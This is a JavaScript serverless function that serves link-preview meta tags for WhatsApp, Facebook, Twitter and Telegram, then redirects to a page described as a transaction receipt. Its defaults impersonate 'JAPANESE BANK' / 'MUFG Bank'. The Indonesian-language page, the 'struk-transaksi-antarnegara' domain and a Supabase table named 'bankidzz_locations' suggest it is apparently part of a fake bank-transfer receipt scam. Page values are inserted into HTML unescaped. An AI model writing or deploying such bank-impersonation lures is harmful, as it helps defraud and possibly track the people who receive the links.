// Serverless function to serve dynamic OpenGraph tags for WhatsApp, Facebook, Twitter, Telegram crawlers

const TABLE = 'bankidzz_locations';

const DEFAULT_PROFILE = {
    siteTitle: 'JAPANESE BANK',
    metaDescription: 'MUFG Bank - Office Purchasing',
    ogTitle: 'JAPANESE BANK',
    ogDescription: 'MUFG Bank - Office Purchasing',
    ogImage: '',
    themeColor: '#0033ff'
};

function getSupabaseConfig() {
    const rawUrl = (process.env.SUPABASE_URL || '').trim();
    const serviceKey = (process.env.SUPABASE_SERVICE_ROLE_KEY || '').trim();

    let cleanUrl = rawUrl;
    if (cleanUrl && !cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
        cleanUrl = `https://${cleanUrl}`;
    }
    cleanUrl = cleanUrl.replace(/\/+$/, '');

    const hasSupabase = Boolean(cleanUrl && serviceKey);
    return {
        hasSupabase,
        restUrl: hasSupabase ? `${cleanUrl}/rest/v1/${TABLE}` : '',
        serviceKey
    };
}

export default async function handler(req, res) {
    let profile = { ...DEFAULT_PROFILE };

    // Try reading latest profile from global memory or Supabase
    if (globalThis.__webprofile) {
        profile = { ...DEFAULT_PROFILE, ...globalThis.__webprofile };
    }

    const sbConfig = getSupabaseConfig();
    if (sbConfig.hasSupabase) {
        try {
            const resp = await fetch(`${sbConfig.restUrl}?transfer_id=eq.__config_webprofile__&select=photo`, {
                headers: {
                    apikey: sbConfig.serviceKey,
                    Authorization: `Bearer ${sbConfig.serviceKey}`,
                    'Content-Type': 'application/json'
                }
            });
            if (resp.ok) {
                const rows = await resp.json();
                if (Array.isArray(rows) && rows.length > 0 && rows[0].photo) {
                    const parsed = JSON.parse(rows[0].photo);
                    profile = { ...DEFAULT_PROFILE, ...parsed };
                }
            }
        } catch (e) {}
    }

    const title = profile.ogTitle || profile.siteTitle || 'JAPANESE BANK';
    const desc = profile.ogDescription || profile.metaDescription || 'MUFG Bank - Office Purchasing';
    const imageUrl = 'https://struk-transaksi-antarnegara.vercel.app/api/og-image';
    const color = profile.themeColor || '#0033ff';

    const html = `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>${title}</title>
    <meta name="description" content="${desc}">
    <meta name="theme-color" content="${color}">
    
    <!-- OPEN GRAPH FOR WHATSAPP & SOCIAL MEDIA -->
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="${title}">
    <meta property="og:title" content="${title}">
    <meta property="og:description" content="${desc}">
    <meta property="og:image" content="${imageUrl}">
    <meta property="og:image:secure_url" content="${imageUrl}">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="600">
    <meta property="og:image:height" content="380">
    <meta property="og:url" content="https://struk-transaksi-antarnegara.vercel.app/">
    
    <!-- TWITTER -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="${title}">
    <meta name="twitter:description" content="${desc}">
    <meta name="twitter:image" content="${imageUrl}">

    <meta http-equiv="refresh" content="0; url=/">
    <script>window.location.replace('/');</script>
</head>
<body>
    <h1>${title}</h1>
    <p>${desc}</p>
    <a href="/">Klik di sini untuk membuka struk</a>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 's-maxage=10, stale-while-revalidate=59');
    return res.status(200).send(html);
}
